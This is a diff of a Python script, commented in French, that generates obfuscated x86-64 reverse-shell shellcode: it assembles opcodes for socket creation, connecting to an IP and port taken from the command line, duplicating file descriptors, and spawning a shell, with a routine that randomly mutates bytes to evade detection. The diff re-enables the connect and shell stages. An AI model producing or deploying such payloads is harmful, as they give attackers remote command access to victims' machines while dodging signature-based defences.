@@ -100,7 +100,7 @@ def factorOffus(string4Payload):
     #Ce tableau setted sera notre tableau de référence pour add ou sub une valeur à chaque double octet de notre string(elle, en hexa)
     theOneArr[:]= list(set(theOneArr))
 
-    rand = r(theOneArr[0],theOneArr[-1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur
+    rand = r(theOneArr[0],theOneArr[1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur
 
     #Si l'opérateur été "-", on rend positif la valeur choisie aléatoirement
     if ope == 1 :
@@ -248,7 +248,7 @@ def create_socket():
     PAYLOAD += call()
 
 
-'''
+
 def socket_connect(ip, port):
    
    global PAYLOAD
@@ -328,8 +328,8 @@ def socket_connect(ip, port):
    add_string += call()
    PAYLOAD += add_string
    return PAYLOAD
-'''
 
+'''
 def deof_socket_connect(ip, port):
     global PAYLOAD
     l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
@@ -368,7 +368,7 @@ def deof_socket_connect(ip, port):
     PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
-
+'''
 def dup2x3():
     global PAYLOAD
     PAYLOAD += clean('rax')
@@ -500,10 +500,10 @@ PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
 PAYLOAD += clean("rsi")
 create_socket()
-#connect_socket(argv[1], argv[2])
-deof_socket_connect(argv[1], argv[2])
+socket_connect(argv[1], argv[2])
+#deof_socket_connect(argv[1], argv[2])
 dup2x3()
-#shell()
+shell()
 #deof_shell()
 _exit()
 #print(bit_to_opcode(PAYLOAD))
